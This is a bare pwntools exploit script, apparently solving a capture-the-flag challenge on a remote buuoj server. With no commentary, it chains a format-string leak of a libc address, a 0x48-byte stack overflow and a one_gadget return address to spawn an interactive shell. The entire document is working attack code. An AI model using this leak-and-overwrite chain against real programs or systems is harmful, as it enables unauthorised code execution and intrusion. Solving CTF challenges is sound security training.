from pwn import *
start = 0x400550
r = remote('node3.buuoj.cn',27634)
#r = process('./main')
libc = ELF('./libc-2.27.so')
elf = ELF('./main')

r.recvuntil('inputz: \n')
payload = '%2$pfuck'.ljust(0x48, 'a') + p64(start)
r.sendline(payload)
libc_base = int(r.recvuntil('fuck',drop=True), 16) +0x10-libc.sym['__after_morecore_hook']
log.success(hex(libc_base))
one = libc_base + 0x4f322
r.recvuntil(': ')
r.sendline(('a'*0x48 + p64(one)))
r.interactive()
